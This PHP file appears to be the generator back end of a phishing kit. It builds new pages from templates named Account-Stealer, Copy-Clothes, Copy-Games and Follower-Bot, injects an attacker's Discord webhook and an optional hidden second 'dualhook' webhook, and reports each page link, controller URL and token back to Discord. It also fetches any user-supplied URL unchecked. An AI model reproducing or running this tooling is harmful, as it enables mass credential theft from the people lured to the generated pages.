<?php
function token($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
}
$dir = $_GET['dir'];
$web = $_GET['web'];
$t = $_GET['t'];
if (preg_match('/[^A-Za-z0-9]/', $dir)){
$error = "Directory can only contain letters and numbers!"; 
} 


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $web); 
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($curl, CURLOPT_HTTPGET, true);
$req = curl_exec($curl);
$jd = json_decode($req, true);
$err = $jd['guild_id'];



if ($err == "") {
$error = "Invalid Webhook";
}
if ($t == "as") {
$fol = "Account-Stealer";
}
if ($t == "cc"){
$fol = "Copy-Clothes";
}
if ($t == "gc"){
$fol = "Copy-Games";
}
if ($t == "fb"){
$fol = "Follower-Bot";
}
if ($error == "")
{
if (!file_exists("../../$dir")) { 
mkdir("../../$dir");
$index = file_get_contents("../../$fol/index.php");
if ($t == "dg") {
$index = file_get_contents("indexdh.php");
}
$index = str_replace("{web}", $web, $index);
$index = str_replace("{dualhook}", $_GET['dualhook'], $index);
$token = token();
$tw = "$dir $web";
$path = "../../$dir/"; 
$path2 = "tokens/";
$fuck = file_get_contents("../../txt/webhooks.txt");
file_put_contents("../../txt/webhooks.txt","$fuck
$web");
$fo = fopen($path."index.php", 'w'); 
$visit = fopen($path."visits.txt", 'w'); 
$logs = fopen($path."logs.txt", 'w'); 
$fo2 = fopen($path2."$token.txt", 'w'); 
if ($fo) {
if ($t == "dg") {
  fwrite($fo, $index);
}else{
    fwrite($fo, $index); 
    fwrite($fo2, $tw); 
    fwrite($visit, ''); 
    fwrite($logs, ''); 
}
$dom = $_SERVER['SERVER_NAME'];
$timestamp = date("c", strtotime("now"));
if ($t == "dg") {
$json_data = json_encode([
    // Message
    "content" => "", //bruh we dont need this shishitshity ping
    // Username
    "username" => "CAL",
    // Avatar URL.
    // Uncomment to replace image set in webhook
    "avatar_url" => "https://cdn.discordapp.com/icons/1050572542634639420/2abb6780ef2c57ff0302b4d1292218ac.webp?size=2048",
    // Text-to-speech
    "tts" => false,
    // File upload
    // "file" => "",
    // Embeds Array
    "embeds" => [
        [
            // ves dont do it
            "title" => "CAL - Gen Result" ,
            "type" => "rich",
            "description" => "",
            "timestamp" => $timestamp,
            "color" => hexdec("2f3136"),
            "footer" => [
                "text" => "Made by versatile.9030",            
            ],
            "fields" => [
                
                [
                    "name" => "Link:",
                    "value" => "https://$dom/$dir",
                    "inline" => false
                ]
            ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
}else{
$json_data = json_encode([
    // Message
    "content" => "", //bruh we dont need this shishitshity ping
    // Username
    "username" => "CAL",
    // Avatar URL.
    // Uncomment to replace image set in webhook
    "avatar_url" => "https://cdn.discordapp.com/icons/1050572542634639420/2abb6780ef2c57ff0302b4d1292218ac.webp?size=2048",
    // Text-to-speech
    "tts" => false,
    // File upload
    // "file" => "",
    // Embeds Array
    "embeds" => [
        [
            // ves dont do it
            "title" => "CAL - Gen Result" ,
            "type" => "rich",
            "description" => "",
            "timestamp" => $timestamp,
            "color" => hexdec("2f3136"),
            "footer" => [
                "text" => "Made by versatile.9030",            
            ],
            "fields" => [
                
                [
                    "name" => "Link:",
                    "value" => "https://$dom/$dir",
                    "inline" => false
                ],
                [
                    "name" => "Controller:",
                    "value" => "https://$dom/controlPage/sign-in.php?token=$token",
                    "inline" => false
                ],
                [
                    "name" => "Token:",
                    "value" => "$token",
                    "inline" => false
                ]  
            ]
        ]
    ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
}
$ch = curl_init($web);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);
}
}else {
echo "Directory Taken";
}
}else {
echo $error;
}